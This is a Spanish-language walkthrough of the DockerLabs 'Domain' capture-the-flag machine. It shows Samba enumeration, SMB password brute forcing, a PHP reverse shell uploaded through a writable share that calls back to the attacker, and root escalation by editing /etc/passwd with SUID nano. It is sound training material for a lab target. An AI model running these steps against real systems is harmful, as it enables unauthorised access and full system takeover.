---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Domain DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip domain.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh domain.tar
```

Info:

```
stamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 12:55 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000022s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-28T16:56:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds
```

## enum4linux

Vemos que tenemos un `samba` activo, por lo que probaremos a enumerarlo.

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 28 13:36:12 2024

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.17.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.17.0.2 )=================================

Looking up status of 172.17.0.2
No reply from 172.17.0.2

 ====================================( Session Check on 172.17.0.2 )====================================


[+] Server 172.17.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.17.0.2 )=================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ====================================( OS information on 172.17.0.2 )====================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 172.17.0.2 from srvinfo:                                                                                                                 
        8247985FD3CF   Wk Sv PrQ Unx NT SNT 8247985fd3cf server (Samba, Ubuntu)                                                                              
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                             
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc:                                                                                
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]

 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                                                             
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                        

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        html            Disk      HTML Share
        IPC$            IPC       IPC Service (8247985fd3cf server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                   
                                                                                                                                                             
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//172.17.0.2/html       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                   
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.17.0.2 )=============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 172.17.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] 8247985FD3CF
        [+] Builtin

[+] Password Info for Domain: 8247985FD3CF

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 ========================================( Groups on 172.17.0.2 )========================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ===================( Users on 172.17.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\bob (Local User)                                                                                                                     
S-1-22-1-1001 Unix User\james (Local User)

[+] Enumerating users using SID S-1-5-21-706547515-1239202993-1284291241 and logon username '', password ''                                                  
                                                                                                                                                             
S-1-5-21-706547515-1239202993-1284291241-501 8247985FD3CF\nobody (Local User)                                                                                
S-1-5-21-706547515-1239202993-1284291241-513 8247985FD3CF\None (Domain Group)
S-1-5-21-706547515-1239202993-1284291241-1000 8247985FD3CF\james (Local User)
S-1-5-21-706547515-1239202993-1284291241-1001 8247985FD3CF\bob (Local User)

 ================================( Getting printer info for 172.17.0.2 )================================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Mon Oct 28 13:36:48 2024
```

Descubrimos 2 usuarios llamados `bob` y `james` a nivel de sistema, ahora probaremos a enumerar los recursos compartidos con un `NullSesion`.

```shell
smbclient -L <IP> -N
```

Info:

```
 Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        html            Disk      HTML Share
        IPC$            IPC       IPC Service (8247985fd3cf server (Samba, Ubuntu))
```

Descubrimos esos recursos compartidos y el mas interesante es el llamado `html`, por lo que nos meteremos a el, pero nos pedira una contraseña, por lo que le tiraremos fuerza bruta de la siguiente forma.

```shell
crackmapexec smb <IP> -u bob -p <WORDLIST>
```

Info:

```
SMB         172.17.0.2      445    8247985FD3CF     [+] 8247985FD3CF\bob:star 
```

Por lo que vemos la contraseña del usuario `bob` es `star`, por lo que nos conectaremos con dichas credenciales de la siguiente forma en `samba`.

```shell
smbclient //<IP>/html -U 'bob' --password='star' 
```

Si listamos los archivos, vemos que hay un `index.html` por lo que creemos que esta conectado al propio `apache2` del servidor donde se aloja en el `html`, por lo que subiremos un archivo malicoso con una `Reverse Shell` para darnos una shell a nuestra terminal utilizando `netcat` y ejecutandolo desde el navegador.

Creamos el archivo `shell.php`:

```shell
nano shell.php

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Dentro del `samba` lo subiremos:

```shell
put shell.php
```

Y una vez echo todo esto, estaremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y por ultimo accederemos al archivo mediante el navegador web para que se ejecute:

```
URL = http://<IP>/shell.php
```

Y con esto obtendremos una shell como el usuario `www-data`.

Info:

```
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [172.17.0.2] 37640
whoami
www-data
```

Ahora vamos a sanitizar la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos con este usuario, podremos ver lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2097695     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
  2097463     72 -rwsr-xr-x   1 root     root        72712 Feb  6  2024 /usr/bin/chfn
  2097669     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
  2097594     40 -rwsr-xr-x   1 root     root        40496 Feb  6  2024 /usr/bin/newgrp
  2097605     60 -rwsr-xr-x   1 root     root        59976 Feb  6  2024 /usr/bin/passwd
  2097531     72 -rwsr-xr-x   1 root     root        72072 Feb  6  2024 /usr/bin/gpasswd
  2097469     44 -rwsr-xr-x   1 root     root        44808 Feb  6  2024 /usr/bin/chsh
  2097589     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
  2101657    280 -rwsr-xr-x   1 root     root       283144 Feb 19  2022 /usr/bin/nano
  2101872     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos que tenemos permisos `SUID` en `nano` por lo que podremos ejecutar nano bajo los permisos de `root` por lo que haremos lo siguiente:

En la maquina atacante codificaremos un password para `root`:

```shell
openssl passwd -6 1234
```

En la maquina victima:

```shell
nano /etc/passwd

#Dentro del nano
# Linea antigua root:x:0:0:root:/root:/bin/bash
root:$6$D5Pf8XtUztx3knXj$15lTMFZhwpOz/wuEdiEByjDNKbHzE/ogsRBX2CTEOyZxpLUVMiFM6.7bzcxxVHIkjEu5D7wzHpdFmcgZVyUHe0:0:0:root:/root:/bin/bash
```

Y cambiamos la `x` por el hash que generamos que seria la contarseña `1234`, por lo que lo guardaremos y escalaremos a `root` con esa contraseña.

```shell
su root
```

Metemos la contraseña `1234` que pusimos con ese hash y ya seremos `root`.
